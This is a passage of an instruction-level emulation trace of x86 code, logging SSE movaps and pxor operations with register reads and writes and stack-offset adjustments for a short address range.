0xb0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f702: movaps xmmword ptr [ebp - 0x70], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f706: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f70e: movaps xmm1, xmmword ptr [ebp - 0x250], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 0x42f726: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f733: movaps xmm6, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x42f73a: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f73e: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f74b: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x42f74e: movaps xmmword ptr [ebp - 0x60], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f75a: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x42f761: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f765: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42f769: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x42f76c: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f770: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f777: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f77c: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42f77f: movaps xmm5, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f787: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42f793: movaps xmmword ptr [ebp - 0x110], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f79a: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f7ab: movaps xmm7, xmm2, regs_read: [124], regs_write: [129] 0x42f7ae: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f7c3: movaps xmmword ptr [ebp - 0x30], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f7eb: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42f813: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f825: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f835: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x42f841: movaps xmmword ptr [ebp - 0x130], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42f848: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f856: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x42f861: movaps xmmword ptr [ebp - 0x70], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f865: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42f86d: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f871: pxor xmm5, xmmword ptr [ebp - 0x20], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42f888: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f894: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f8a9: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f8b9: movaps xmmword ptr [ebp - 0x110], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f8c0: movaps xmm0, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x42f8d3: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f8ea: movaps xmmword ptr [ebp - 0xb0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f8fd: movaps xmm2, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f909: movaps xmm1, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f90d: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42f914: movaps xmmword ptr [ebp - 0x40], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42f91d: movaps xmm6, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x42f924: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f931: pxor xmm2, xmm6, regs_read: [124, 128], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f935: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42f942: movaps xmmword ptr [ebp - 0x70], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f94a: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x42f94d: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f959: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f95e: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f962: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f966: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x42f969: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f976: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f97a: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42f986: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f98a: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42f993: movaps xmmword ptr [ebp - 0x30], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f9ba: movaps xmm5, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f9be: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f9f4: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42fa16: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fa1f: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fa23: movaps xmmword ptr [ebp - 0xc0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42fa2a: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42fa32: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fa44: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x42fa47: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42fa5b: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42fa5e: pxor xmm5, xmmword ptr [ebp - 0xc0], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x42fa6f: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42fa7b: movaps xmmword ptr [ebp - 0xb0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42fa8e: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42fa9e: movaps xmmword ptr [ebp - 0x70], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42faa2: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42faa6: movaps xmm3, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x42fab5: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42fac6: movaps xmm6, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42faca: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fad7: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fadb: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42fae8: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42faeb: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42faf7: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x42fafe: movaps xmmword ptr [ebp - 0xb0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42fb05: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42fb0c: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fb10: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42fb15: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42fb18: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42fb1b: movaps xmmword ptr [ebp - 0x130], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42fb26: movaps xmmword ptr [ebp - 0x20], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42fb38: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fb3c: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fb40: movaps xmm5, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42fb44: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x42fb47: movaps xmm7, xmm2, regs_read: [124], regs_write: [129] 0x42fb5a: movaps xmmword ptr [ebp - 0x30], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42fba0: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42fbcd: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fbd1: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fbd5: movaps xmmword ptr [ebp - 0x60], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42fbde: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42fbea: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fbfc: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x42fbff: movaps xmmword ptr [ebp - 0x70], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42fc10: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42fc13: pxor xmm5, xmmword ptr [ebp - 0x60], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x42fc21: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42fc2d: movaps xmmword ptr [ebp - 0xc0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42fc46: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42fc4a: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42fc6a: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42fc77: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42fc7b: pxor xmm0, xmmword ptr [ebp - 0x10], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42fc91: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42fc9e: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fca2: movaps xmmword ptr [ebp - 0xb0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42fcb2: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42fcbe: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x42fcc1: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42fcc9: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x42fccc: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42fcd3: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42fcd8: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fcdc: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x42fce8: movaps xmm5, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42fcf1: movaps xmm3, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42fcf5: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fcff: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42fd12: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fd1b: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42fd36: movaps xmmword ptr [ebp - 0x130], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42fd42: movaps xmm0, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x42fd4d: movaps xmm2, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x42fd66: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fd6e: movaps xmmword ptr [ebp - 0x40], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42fd7a: pxor xmm5, xmm4, regs_read: [127, 126], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fd88: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x42fd8b: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42fd9b: movaps xmm6, xmm3, regs_read: [125], regs_write: [128] 0x42fd9e: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fda2: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42fdb7: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fdcc: movaps xmmword ptr [ebp - 0x130], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42fe0f: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42fe17: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fe31: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42fe35: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fe39: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42fe4a: movaps xmmword ptr [ebp - 0xc0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42fe51: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42fe55: pxor xmm0, xmm6, regs_read: [122, 128], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fe59: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42fe5d: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42fe68: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42fe6f: pxor xmm1, xmmword ptr [ebp - 0x130], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x42fe7c: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fe80: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42fe8c: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42fe9f: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x42fea2: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42fecb: movaps xmmword ptr [ebp - 0x40], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42fefc: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x42ff08: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42ff1b: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ff2b: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ff39: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x42ff44: movaps xmmword ptr [ebp - 0x30], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42ff48: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42ff50: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ff54: movaps xmmword ptr [ebp - 0xc0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42ff64: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42ff68: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42ff70: pxor xmm5, xmmword ptr [ebp - 0x30], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42ff7e: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42ff8e: movaps xmmword ptr [ebp - 0x130], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42ff9a: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42ff9e: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42ffba: movaps xmm6, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x42ffc2: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42ffcf: movaps xmm2, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x42ffde: movaps xmm0, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42ffe2: pxor xmm0, xmmword ptr [ebp - 0x10], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42fff8: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430000: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430004: movaps xmmword ptr [ebp - 0x40], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430011: movaps xmmword ptr [ebp - 0x130], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430020: movaps xmm7, xmm2, regs_read: [124], regs_write: [129] 0x430023: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x43002e: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: 